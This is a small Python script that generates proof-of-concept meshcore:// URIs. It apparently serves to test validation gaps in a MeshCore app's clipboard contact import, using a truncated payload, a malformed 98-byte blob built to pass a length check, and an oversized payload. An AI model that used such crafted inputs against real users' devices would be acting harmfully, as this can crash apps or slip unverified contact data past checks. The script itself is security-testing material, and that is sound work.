#!/usr/bin/env python3
"""Generate local PoCs for MeshCore clipboard contact import validation gaps.

The output is a meshcore:// URI suitable for manual testing in a local/dev app
session. It does not connect to BLE/USB/TCP devices or transmit anything.
"""

from __future__ import annotations

import argparse
import sys


SCHEME = "meshcore://"


def uri_from_bytes(payload: bytes) -> str:
    return SCHEME + payload.hex()


def oversized_payload(size: int) -> bytes:
    if size < 1:
        raise ValueError("size must be positive")
    return b"A" * size


def short_malformed_payload() -> bytes:
    return b"\x00"


def non_advert_like_payload() -> bytes:
    # 98 bytes matches the UI's minimum exported-contact length check, but the
    # content is intentionally not a valid signed advert/contact packet.
    payload = bytearray(98)
    payload[0:4] = b"POC!"
    payload[36] = 0xFF
    payload[-4:] = b"END!"
    return bytes(payload)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Generate meshcore:// clipboard import PoC payloads."
    )
    parser.add_argument(
        "case",
        choices=("short", "non-advert", "oversized"),
        help="PoC case to generate.",
    )
    parser.add_argument(
        "--size",
        type=int,
        default=4096,
        help="Byte length for the oversized case. Default: 4096.",
    )
    args = parser.parse_args()

    if args.case == "short":
        payload = short_malformed_payload()
    elif args.case == "non-advert":
        payload = non_advert_like_payload()
    else:
        payload = oversized_payload(args.size)

    sys.stdout.write(uri_from_bytes(payload))
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
